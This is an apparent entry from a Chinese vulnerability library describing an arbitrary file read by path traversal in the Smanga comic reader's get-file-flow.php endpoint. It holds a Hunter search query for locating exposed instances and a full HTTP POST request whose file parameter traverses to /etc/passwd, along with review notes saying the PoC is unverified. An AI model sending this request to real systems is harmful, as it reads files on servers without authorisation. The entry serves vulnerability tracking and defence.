---
source: "wy876 漏洞文库"
title: "Smanga get-file-flow file路径遍历读取"
product: "Smanga"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "版本未知；PHP进程/容器可读范围"
prerequisites: "样例仅trace配置Cookie，认证状态未知"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/fgkpb2mlbe6egiwy"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/smanga%E6%BC%AB%E7%94%BB/Smangaget-file-flow%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md"
fofa_unverified: "web.title=="
hunter: "web.title==\"smanga\""
id: "vw-0f79dec4b9e11e89911ae542"
entity_id: "ve-0f79dec4b9e11e89911ae542"
schema_version: "1"
---

# Smanga get-file-flow file路径遍历读取

## 条目说明

- 对象与具体问题：Smanga；get-file-flow file路径遍历读取
- 版本、配置及部署条件：版本未知；PHP进程/容器可读范围
- 认证与权限前提：样例仅trace配置Cookie，认证状态未知
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 只有passwd读取请求，无返回/源码/补丁；容器文件不等于宿主系统文件
- trace Cookie非登录凭据但不能据此证明匿名可达，需确认路由鉴权
- HTTP误标Java；Hunter语法抽入fofa残缺字段

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

## 一、漏洞简介
Smanga无需配置，docker直装的漫画流媒体阅读工具。以emby plex为灵感，为解决漫画阅读需求而开发的漫画阅读器。Smanga get-file-flow存在任意文件读取漏洞。

## 二、影响版本
+ Smanga

## 三、资产测绘
+ hunter`web.title=="smanga"`
+ 特征


## 四、漏洞复现
```http
POST /php/get-file-flow.php HTTP/1.1
Host: 
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,ak;q=0.8
Cookie: thinkphp_show_page_trace=0|0
Connection: close
Content-Type: application/x-www-form-urlencoded

file=../../../../../../../../etc/passwd
```

> 请求长度说明：原资料 Content-Length 为 39；静态长度已移除，应由客户端根据最终请求体的字节数生成。


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/fgkpb2mlbe6egiwy>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
